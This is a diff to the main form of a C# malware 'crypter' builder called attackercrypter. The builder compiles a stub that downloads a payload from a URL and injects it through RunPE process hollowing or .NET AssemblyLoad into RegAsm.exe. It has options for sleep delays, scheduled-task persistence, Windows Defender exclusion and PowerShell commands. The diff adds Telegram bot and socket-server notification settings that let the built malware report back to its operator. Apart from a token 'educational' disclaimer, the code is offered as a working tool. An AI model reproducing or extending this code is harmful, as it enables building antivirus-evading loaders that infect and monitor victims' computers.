@@ -20,12 +20,15 @@ namespace attackercrypter
     // This Software For educational Don t try on somewhere you don t have permission to try on
     public partial class Form1 : Form
     {
+        private readonly NotifySettings notifyForm;
+
         int everytihnggood = 1;
         string RunPE32 = Properties.Resources.Nik32;
         string RunPE64 = Properties.Resources.NIK64;
 
         public Form1()
         {
+            this.notifyForm = new NotifySettings();
             InitializeComponent();
             Injection.SelectedItem = "AssemblyLoad(.Net)";
             Netinjectionpath.SelectedItem = "RegAsm.exe";
@@ -137,18 +140,18 @@ namespace attackercrypter
             string Main = Properties.Resources.Program;
 
             everytihnggood = 1;
-           
-            
+
+
 
             if (string.IsNullOrEmpty(textBox4.Text))
             {
                 MessageBox.Show("Enter URL");
             }
-            else if(isNative.Checked == false && isNet.Checked == false)
+            else if (runpecheck.Checked == true && isNative.Checked == false && isNet.Checked == false)
             {
                 MessageBox.Show("Choose if your payload Native or .NET -_-");
             }
-            else if(radio32.Checked == false && radio64.Checked == false)
+            else if (runpecheck.Checked == true && radio32.Checked == false && radio64.Checked == false)
             {
                 MessageBox.Show("Choose if it x64 or x32 -_-");
 
@@ -174,9 +177,9 @@ namespace attackercrypter
                     Params.CompilerOptions += "\n/win32icon:" + TxtIcon.Text;
                 }
                 Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
-                
+
                 string Source = Properties.Resources.config;
-         
+
 
 
 
@@ -187,8 +190,13 @@ namespace attackercrypter
 
                 if (Sleeptime.Checked)
                 {
-                    Source = Source.Replace("public static int sleeptime = 1*1000;", $"public static int sleeptime = {numericUpDownSleep.Value.ToString()}*1000;");
+                    Source = Source.Replace("$SLEEPTIME", (numericUpDownSleep.Value * 1000).ToString());
                     Source = Source.Replace("public static bool issleep = false;", "public static bool issleep = true;");
+                }
+                else
+                {
+                    Source = Source.Replace("$SLEEPTIME", "1000");
+                    Source = Source.Replace("$SLEEPTIME", "1000");
                 }
                 if (checkBox2.Checked)
                 {
@@ -203,7 +211,7 @@ namespace attackercrypter
 
 
                 }
-                else if(checkBox2.Checked && radioButton2.Checked){
+                else if (checkBox2.Checked && radioButton2.Checked) {
                     Source = Source.Replace("public static int taskm = 0;", $"public static int taskm = {numericUpDownSc.Value.ToString()};");
                     Source = Source.Replace("public static bool istask = false;", "public static bool istask = true;");
 
@@ -212,10 +220,71 @@ namespace attackercrypter
                 if (exdf.Checked)
                 {
                     Source = Source.Replace("public static bool isexcludewd = false;", "public static bool isexcludewd = true;");
-                    
+
 
                 }
+                if (tg.Checked)
+                {
+                    string filename = "tgbot.txt";
 
+                    if (!File.Exists(filename))
+                    {
+                        MessageBox.Show("Check notify Settings");
+                        return;
+                    }
+                    else
+                    {
+                        using (StreamReader reader = new StreamReader(filename))
+                        {
+                            string content = reader.ReadToEnd();
+
+                            char[] delimiter = { '|' };
+                            string[] splitinfo = content.Split(delimiter);
+                            string bottoken = splitinfo[0];
+                            string chatid = splitinfo[1];
+                            Source = Source.Replace("$bottoken", bottoken);
+                            Source = Source.Replace("$chatid", chatid);
+                            Source = Source.Replace("public static bool istelegramnotify = false;", "public static bool istelegramnotify = true;");
+                        }
+                    
+
+
+                    }
+                    
+                   
+                    
+                }
+                if (sock.Checked)
+                {
+                    string sockfilename = "ServerCred.txt";
+                    if (!File.Exists(sockfilename))
+                    {
+                        MessageBox.Show("Check notify Settings");
+                        return;
+                    }
+                    else
+                    {
+                        using (StreamReader reader = new StreamReader(sockfilename))
+                        {
+                            string content = reader.ReadToEnd();
+
+                            char[] delimiter = { '|' };
+                            string[] splitinfo = content.Split(delimiter);
+                            string ip = splitinfo[0];
+                            string port = splitinfo[1];
+                            string password = splitinfo[2];
+                            Source = Source.Replace("$IP", ip);
+                            Source = Source.Replace("$PORT", port);
+                            Source = Source.Replace("$serverpassword", password);
+                            Source = Source.Replace("public static bool issocketnotify = false;", "public static bool issocketnotify = true;");
+                        }
+                    }
+                }
+                else
+                {
+                    Source = Source.Replace("$PORT", "0");
+
+                }
                 if (powershell.Checked == true)
                 {
                     Source = Source.Replace("public static bool ispwcommand = false;", "public static bool ispwcommand = true;");
@@ -413,6 +482,11 @@ namespace attackercrypter
         private void button7_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private void button7_Click_1(object sender, EventArgs e)
+        {
+            notifyForm.ShowDialog();
         }
     }
 }
